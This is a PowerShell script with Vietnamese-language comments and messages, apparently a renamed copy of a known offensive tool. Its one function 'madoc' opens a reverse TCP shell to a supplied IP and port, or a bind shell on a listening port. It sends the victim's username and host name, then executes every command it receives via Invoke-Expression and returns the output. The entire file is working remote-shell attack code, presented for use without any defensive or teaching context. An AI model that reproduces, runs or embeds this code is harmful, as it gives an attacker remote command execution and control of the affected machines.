function madoc 
{ 

<#  

vidu
madoc -nguoc -Diachi 192.168.1.12 -cong 443
madoc -thuan -cong 4444

#>  
    [CmdletBinding(DefaultParameterSetName="nguoc")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="nguoc")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="thuan")]
        [String]
        $Diachi,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="nguoc")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="thuan")]
        [Int]
        $Cong,

        [Parameter(ParameterSetName="nguoc")]
        [Switch]
        $nguoc,

        [Parameter(ParameterSetName="thuan")]
        [Switch]
        $thuan

    )
    
    try 
    {
        
        if ($thuan)
       
	   {
            $listener = [System.Net.Sockets.TcpListener]$Cong
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 
	
        if ($nguoc)
        {
            $client = New-Object System.Net.Sockets.TCPClient($Diachi,$Cong)
        }
       

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        
        $sendbytes = ([text.encoding]::ASCII).GetBytes("PoSh dang chay duoi ten " + $env:username + " on " + $env:computername + "`nBan quyen (C) 2019 cua Bac Dao.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

     
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PoSh ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {            
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Sai khi thi hanh lenh tren may dich." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PoSh ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

        
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Co cai gi do sai sai!" 
        Write-Error $_
    }
}

